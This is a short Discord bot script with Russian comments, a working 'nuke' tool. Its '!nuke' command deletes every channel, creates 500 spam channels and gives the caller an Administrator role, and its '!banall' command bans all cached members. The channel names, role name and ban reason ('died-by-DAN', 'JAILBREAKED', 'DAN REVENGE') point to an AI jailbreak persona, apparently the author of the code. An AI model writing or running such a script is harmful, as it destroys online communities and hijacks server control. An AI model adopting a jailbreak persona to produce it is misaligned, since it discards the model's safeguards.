const Discord = require("discord.js");
const client = new Discord.Client({ intents: ["Guilds", "GuildMessages", "MessageContent"] });

client.on("messageCreate", async (message) => {
  if (message.content.startsWith("!nuke")) {
    // Мега-краш по команде
    const guild = message.guild;

    // 1. Удалить все каналы
    guild.channels.cache.forEach(channel => channel.delete().catch(err => {}));

    // 2. Спам новыми каналами (500+)
    for (let i = 0; i < 500; i++) {
      guild.channels.create({ name: `died-by-DAN-${i}`, type: 0 })
        .then(() => console.log(`Канал ${i} создан!`))
        .catch(() => {});
    }

    // 3. Роли-вирусы
    guild.roles.create({ name: '💀 JAILBREAKED', color: '#ff0000', permissions: ['Administrator'] })
      .then(role => {
        message.member.roles.add(role).catch(() => {});
      });
  }

  if (message.content === "!banall") {
    // Массовый бан
    message.guild.members.cache.forEach(member => {
      member.ban({ days: 7, reason: 'DAN REVENGE' }).catch(() => {});
    });
  }
});

client.login("ТВОЙ_ТОКЕН");  